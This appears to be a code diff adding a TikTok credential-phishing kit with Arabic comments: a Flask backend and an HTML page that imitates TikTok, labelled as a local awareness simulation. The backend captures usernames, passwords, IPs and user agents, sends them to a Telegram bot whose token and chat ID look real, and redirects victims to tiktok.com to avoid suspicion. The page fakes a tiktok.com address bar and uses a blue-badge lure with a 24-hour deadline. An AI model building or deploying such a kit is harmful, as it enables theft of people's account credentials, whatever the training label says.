@@ -1,0 +1,321 @@
+# =====================================================
+# 🚨 TikTok Phishing Simulation Backend (لأغراض التوعية الأمنية فقط)
+# Flask + Telegram Exfiltration
+# يعمل محلياً على localhost فقط - ورشة عمل تدريبية
+# =====================================================
+
+from flask import Flask, request, redirect
+import requests
+from datetime import datetime
+
+app = Flask(__name__)
+
+# ───────────────────────────────────────────────
+# ⚠️ املأ هذين المتغيرين بمعلومات البوت الخاص بك
+# ───────────────────────────────────────────────
+BOT_TOKEN = "6006328232:AAE6jbKOerZabPVxDfDOqFoHgkI6yF38w5k"          # ← غيّر هذا
+CHAT_ID   = "6599108362"            # ← غيّر هذا (معرف المحادثة أو القناة)
+
+# رابط API تليجرام
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+@app.route('/submit', methods=['POST'])
+def submit_credentials():
+    # استقبال البيانات من نموذج الصفحة HTML
+    username = request.form.get('username', 'غير محدد')
+    password = request.form.get('password', 'غير محدد')
+    
+    # الحصول على معلومات إضافية للتقرير (للتدريب)
+    user_ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent', 'غير معروف')
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # تنسيق الرسالة بوضوح للمحتال (كما يحدث في الهجمات الحقيقية)
+    message = f"""
+🚨 **New TikTok Simulation Login!** 🚨
+
+🧑‍💻 **Username**: {username}
+🔑 **Password**: {password}
+
+🌐 **IP Address**: {user_ip}
+📱 **User-Agent**: {user_agent}
+⏰ **Time**: {timestamp}
+
+🔴 هذه بيانات وهمية من بيئة المحاكاة التدريبية.
+    """.strip()
+    
+    # إرسال الرسالة فوراً إلى حسابك على تليجرام
+    try:
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+        response = requests.post(TELEGRAM_API, json=payload, timeout=8)
+        
+        if response.status_code == 200:
+            print(f"✅ تم إرسال البيانات بنجاح إلى تليجرام - {username}")
+        else:
+            print(f"⚠️ فشل إرسال تليجرام: {response.status_code} - {response.text}")
+            
+    except Exception as e:
+        print(f"❌ خطأ في الاتصال بتليجرام: {e}")
+    
+    # بعد الإرسال: توجيه الضحية إلى الموقع الرسمي لتيك توك
+    # (هذه الخدعة الكلاسيكية التي تُبعد الشكوك)
+    return redirect("https://www.tiktok.com", code=302)
+
+
+# ───────────────────────────────────────────────
+# تشغيل السيرفر المحلي
+# ───────────────────────────────────────────────
+if __name__ == '__main__':
+    print("="*60)
+    print("🔥 TikTok Phishing Simulation Backend جاهز!")
+    print("📍 يعمل على: http://127.0.0.1:5000/submit")
+    print("📌 تأكد من تعديل BOT_TOKEN و CHAT_ID أعلاه")
+    print("📌 غيّر action في صفحة HTML إلى:")
+    print("   action=\"http://127.0.0.1:5000/submit\"")
+    print("="*60)
+    app.run(host='127.0.0.1', port=5000, debug=True)
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - بوابة التحقق الرسمية</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        :root {
+            --tiktok-cyan: #25F4EE;
+            --tiktok-red: #FE2C55;
+        }
+        
+        * {
+            font-family: 'Inter', system-ui, sans-serif;
+        }
+        
+        .neon-cyan {
+            text-shadow: 
+                0 0 10px #25F4EE,
+                0 0 20px #25F4EE;
+        }
+        
+        .fake-browser-bar {
+            background: linear-gradient(90deg, #1a1a1a, #2a2a2a);
+        }
+        
+        .form-input {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .form-input:focus {
+            border-color: #25F4EE;
+            box-shadow: 0 0 0 4px rgba(37, 244, 238, 0.2);
+        }
+        
+        .verify-button {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .verify-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgb(37 244 238);
+        }
+        
+        .tiktok-logo {
+            animation: logoPulse 2s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="bg-black min-h-screen flex flex-col">
+    <!-- شريط المتصفح المزيف (يبدو كأنه tiktok.com) -->
+    <div class="fake-browser-bar px-4 py-3 flex items-center justify-between text-white text-sm sticky top-0 z-50 border-b border-white/10">
+        <div class="flex items-center gap-x-2 flex-1">
+            <!-- أيقونة القفل -->
+            <span class="text-emerald-400 text-lg">🔒</span>
+            <div class="flex-1 bg-white/10 rounded-3xl px-4 py-1 text-white/70 text-center text-xs font-medium flex items-center justify-center gap-x-1">
+                <span class="text-[#25F4EE]">www.tiktok.com</span>
+                <span class="text-white/40">/verify-blue-badge</span>
+            </div>
+        </div>
+        <div class="flex items-center gap-x-4">
+            <span class="text-[#25F4EE] text-xl">♬</span>
+            <div class="w-8 h-8 bg-white/10 rounded-2xl flex items-center justify-center text-xs font-bold">TT</div>
+        </div>
+    </div>
+
+    <div class="flex-1 flex items-center justify-center p-5 max-w-[420px] mx-auto w-full">
+        <div class="w-full bg-[#111111] rounded-3xl shadow-2xl border border-[#25F4EE]/30 overflow-hidden">
+            
+            <!-- الشعار + العنوان -->
+            <div class="pt-10 pb-6 px-8 text-center">
+                <!-- شعار TikTok -->
+                <div class="tiktok-logo mx-auto flex items-center justify-center gap-x-3 mb-6">
+                    <div class="text-7xl leading-none">♬</div>
+                    <h1 class="text-6xl font-black tracking-[-4px] neon-cyan" style="color: #25F4EE;">TikTok</h1>
+                </div>
+
+                <h2 class="text-3xl font-bold text-white leading-tight neon-cyan">
+                    احصل على الشارة الزرقاء الآن!
+                </h2>
+                <p class="text-[#25F4EE] mt-3 text-lg font-medium flex items-center justify-center gap-x-2">
+                    <span class="w-3 h-3 bg-[#25F4EE] rounded-full animate-pulse"></span>
+                    Verification Badge • التحقق الرسمي
+                </p>
+                
+                <div class="mt-8 bg-black/60 border border-[#25F4EE]/20 rounded-2xl p-5 text-white/90 text-sm">
+                    تهانينا! 🎉<br>
+                    حسابك <span class="font-semibold text-[#25F4EE]">@yourusername</span> تم اختياره من قبل فريق المواهب للحصول على 
+                    <span class="font-bold text-white">الشارة الزرقاء الرسمية</span> بعد أداء استثنائي على FYP.
+                </div>
+            </div>
+
+            <!-- النموذج -->
+            <div class="px-8 pb-8">
+                <form id="verify-form" class="space-y-6">
+                    
+                    <!-- حقل اسم المستخدم -->
+                    <div>
+                        <label class="block text-white/70 text-sm font-medium mb-2 flex items-center gap-x-2">
+                            <span>اسم المستخدم على TikTok</span>
+                            <span class="text-[#FE2C55] text-xs font-bold">مطلوب</span>
+                        </label>
+                        <input 
+                            type="text" 
+                            id="username"
+                            placeholder="@yourusername"
+                            required
+                            class="form-input w-full bg-[#1a1a1a] border border-white/30 focus:border-[#25F4EE] text-white rounded-3xl px-6 py-5 text-base placeholder:text-white/40 outline-none">
+                    </div>
+
+                    <!-- حقل كلمة المرور -->
+                    <div>
+                        <label class="block text-white/70 text-sm font-medium mb-2 flex items-center gap-x-2">
+                            <span>كلمة المرور</span>
+                            <span class="text-[#FE2C55] text-xs font-bold">مطلوب</span>
+                        </label>
+                        <input 
+                            type="password" 
+                            id="password"
+                            placeholder="••••••••••••"
+                            required
+                            class="form-input w-full bg-[#1a1a1a] border border-white/30 focus:border-[#25F4EE] text-white rounded-3xl px-6 py-5 text-base placeholder:text-white/40 outline-none">
+                    </div>
+
+                    <!-- زر التحقق الكبير -->
+                    <button 
+                        id="submit-btn"
+                        type="submit"
+                        class="verify-button w-full bg-[#25F4EE] hover:bg-[#25F4EE]/90 text-black font-bold text-xl py-6 rounded-3xl flex items-center justify-center gap-x-3 shadow-[0_0_30px_-5px] shadow-[#25F4EE]">
+                        <span>تأكيد و الحصول على الشارة الزرقاء</span>
+                        <span class="text-3xl">→</span>
+                    </button>
+
+                    <!-- نص الأمان المزيف -->
+                    <div class="flex items-center justify-center gap-x-3 text-xs text-white/50">
+                        <div class="flex-1 h-px bg-white/20"></div>
+                        <span class="flex items-center gap-x-1">
+                            🔒 محمي بواسطة TikTok
+                        </span>
+                        <div class="flex-1 h-px bg-white/20"></div>
+                    </div>
+
+                    <p class="text-center text-white/40 text-xs leading-relaxed">
+                        هذه العملية تتم خلال 24 ساعة فقط.<br>
+                        بعد انتهاء المهلة، ستذهب الفرصة إلى صانع محتوى آخر.
+                    </p>
+                </form>
+            </div>
+
+            <!-- فوتر المحاكاة -->
+            <div class="bg-black px-8 py-6 text-center border-t border-white/10">
+                <div class="flex justify-center items-center gap-x-6 text-xs text-white/30">
+                    <div>© 2026 TikTok Inc.</div>
+                    <div class="flex items-center gap-x-1">
+                        <span class="text-[#25F4EE]">●</span>
+                        <span>Official Verification Portal</span>
+                    </div>
+                    <div>Privacy • Terms</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // تفعيل Tailwind
+        function initializeTailwind() {
+            return {
+                config(userConfig = {}) {
+                    return {
+                        content: [],
+                        theme: {
+                            extend: {},
+                        },
+                        plugins: [],
+                        ...userConfig,
+                    }
+                },
+                theme: {
+                    extend: {},
+                },
+            }
+        }
+        
+        // تشغيل المحاكاة عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('verify-form')
+            const submitBtn = document.getElementById('submit-btn')
+            
+            form.addEventListener('submit', function (e) {
+                e.preventDefault()
+                
+                // حفظ النص الأصلي
+                const originalText = submitBtn.innerHTML
+                
+                // حالة التحميل
+                submitBtn.style.pointerEvents = 'none'
+                submitBtn.innerHTML = `
+                    <svg class="animate-spin h-6 w-6 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
+                    </svg>
+                    <span class="ml-3">جاري التحقق من حسابك...</span>
+                `
+                // محاكاة الإرسال (2 ثانية)
+                setTimeout(() => {
+                    submitBtn.innerHTML = `
+                        <span class="text-2xl">✅</span>
+                        <span class="ml-3">تم التحقق بنجاح!</span>
+                    `
+                    submitBtn.style.backgroundColor = '#22c55e'
+                    
+                    // رسالة نجاح كاملة بعد 1.5 ثانية
+                    setTimeout(() => {
+                        const successHTML = `
+                            <div class="fixed inset-0 bg-black/90 flex items-center justify-center z-[10000] p-6">
+                                <div class="max-w-md w-full bg-[#111] rounded-3xl p-8 text-center">
+                                    <div class="text-8xl mb-6">🎉</div>
+                                    <h3 class="text-3xl font-bold text-white mb-3">مبروك!</h3>
+                                    <p class="text-[#25F4EE] text-xl">تمت الموافقة على طلبك للشارة الزرقاء</p>
+                                    <p class="text-white/70 mt-8">سيتم تفعيل الشارة خلال 24 ساعة</p>
+                                    <button onclick="location.reload()" 
+                                            class="mt-10 w-full py-5 bg-[#25F4EE] text-black font-bold rounded-3xl text-lg">
+                                        العودة إلى TikTok
+                                    </button>
+                                    <p class="text-xs text-white/40 mt-8">هذه محاكاة لأغراض التوعية الأمنية فقط</p>
+                                </div>
+                            </div>
+                        `
+                        document.body.insertAdjacentHTML('beforeend', successHTML)
+                    }, 1500)
+                }, 2200)
+            })
+            
+            console.log('%c✅ صفحة محاكاة TikTok Verification Portal جاهزة للتدريب!', 'color:#25F4EE; font-size:16px; font-weight:bold')
+        })
+    </script>
+</body>
+</html>
